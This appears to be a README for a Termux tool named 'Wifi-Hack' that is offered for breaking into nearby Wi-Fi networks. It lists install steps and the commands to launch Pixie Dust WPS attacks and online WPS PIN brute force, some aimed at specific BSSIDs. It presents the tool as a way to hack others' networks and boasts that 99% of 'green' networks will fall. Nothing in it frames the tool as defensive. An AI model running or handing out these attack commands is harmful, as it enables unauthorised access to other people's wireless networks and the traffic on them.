## Wifi-Hack 🗿
### Hack WIfi Using Termux! (Need Rooted Device )🧑‍💻

[![Screenshot-20240524-183227-Termux.png](https://i.postimg.cc/qMjPGGTw/Screenshot-20240524-183227-Termux.png)](https://postimg.cc/vcx2YfDx) 

### How to install :

```bash
pkg update && pkg upgrade
```
```
pkg install git
```
```
pkg install python
```
```bash
apt update && apt upgrade
```
```bash
pkg install -y root-repo && pkg install -y git tsu python wpa-supplicant pixiewps iw && termux-setup-storage
```
```
git clone https://github.com/tanvirhasan999/Wifi-Hack
```
```
cd Wifi-Hack
```
```
chmod +x fück-wifi.py
```
### Note📝 : Now turn off Wifi 
```
sudo python fück-wifi.py -i wlan0 -K
```
## Note📝: It will show all Wifi within your range. Among them, 99% of Green's will be hacked. And the White ones may also be tried. And the Red ones will not be hacked.

## Enter this command to open Tool next time. 
```bash
sudo python Wifi-Hack/fück-wifi.py -i wlan0 -K
```

#### Example : `sudo python Wifi-Hack/fück-wifi.py -i wlan0 -K`

#### Note 📝: 
**First turn off your Wifi.**
- Show avaliable networks and start Pixie Dust attack on a specified network.
- `sudo python Wifi-Hack/fück-wifi.py -i wlan0 -K`
- Start Pixie Dust attack on a specified BSSID:
`sudo python Wifi-Hack/fück-wifi.py -i wlan0 -b 00:91:4C:C3:AC:28 -K`
- Launch online WPS bruteforce with the specified first half of the PIN:
- `sudo python Wifi-Hack/fück-wifi.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234`
## Thanks For Using My Tool ❤️
